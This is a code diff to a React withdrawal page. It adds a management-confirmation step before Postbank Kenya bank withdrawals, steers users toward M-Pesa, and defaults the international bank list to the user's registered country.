@@ -84,6 +84,9 @@ const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
   names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
 ).sort((a, b) => a.name.localeCompare(b.name));
 
+// Registration uses full country names; a few differ from the bank directory.
+const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };
+
 // Withdrawal processing fee — priced in USD, charged in KES via a dynamic conversion.
 const FEE_USD    = 5;
 const USD_TO_KES = 130;                              // approximate USD → KES rate
@@ -300,14 +303,31 @@ function PostbankFlow({ user, initialStep }) {
       {step === 'choice' && (
         <>
           <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
-            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only continue with <strong>Postbank Kenya</strong> if you’re unable to withdraw via Safaricom / M-Pesa.
+            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong> — it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
           </div>
+          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
           <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
-            📲 Withdraw with M-Pesa instead (recommended)
+            ✅ Yes, withdraw with M-Pesa (recommended)
+          </button>
+          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
+            🏦 No, I can’t use M-Pesa
+          </button>
+        </>
+      )}
+
+      {step === 'management' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#B45309', background: '#FFFBEB' }}>
+            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
+          </div>
+          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
+          <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
+            📲 No — take me to M-Pesa
           </button>
           <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('fee')}>
-            🏦 I can’t use M-Pesa — continue with Postbank Kenya
+            🏦 Yes, management asked me — continue with Postbank
           </button>
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
         </>
       )}
 
@@ -410,8 +430,13 @@ function InternationalFlow({ user }) {
   const [done,          setDone]          = useState(false);
   const [sending,       setSending]       = useState(false);
 
+  // Default to the country the user chose at registration
+  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
+  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
   const q = bankQuery.trim().toLowerCase();
-  const filteredBanks = q ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q)) : WORLD_BANKS;
+  const filteredBanks = q
+    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
+    : (homeBanks.length ? homeBanks : WORLD_BANKS);
 
   const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
   const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
@@ -462,7 +487,11 @@ function InternationalFlow({ user }) {
   return (
     <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="🌍" accent="linear-gradient(135deg, #1D4ED8, #2563EB)">
       <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF', marginBottom: 20 }}>
-        For withdrawals outside Kenya, enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.
+        {homeBanks.length ? (
+          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown — or search for a different bank. Our payments team is notified automatically when you submit.</>
+        ) : (
+          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
+        )}
       </div>
 
       <div className="pay-phone-label">Account Holder Name</div>
